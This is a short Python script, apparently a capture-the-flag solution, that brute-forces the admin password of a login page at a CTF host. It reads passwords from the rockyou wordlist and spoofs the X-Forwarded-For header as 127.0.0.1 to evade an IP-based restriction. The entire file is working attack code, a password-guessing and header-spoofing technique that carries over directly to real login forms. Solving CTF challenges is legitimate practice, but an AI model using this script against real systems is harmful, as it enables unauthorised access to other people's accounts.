import requests

s = requests.Session()
set_header = {'x-forwarded-for' : '127.0.0.1'}
url = 'http://swctf.hackersir.org:20100/'

def send_request():
    f = open('/usr/share/wordlists/rockyou.txt')

    while True:
        password = f.readline().replace('\n', '')
        data = {
            'user' : 'admin',
            'pass' : password
        }
        
        result = s.post(url, headers=set_header, data=data).text
        if 'error' not in result:
            print(result)
            break
        else:
            print(password)

if __name__ == '__main__':
    send_request()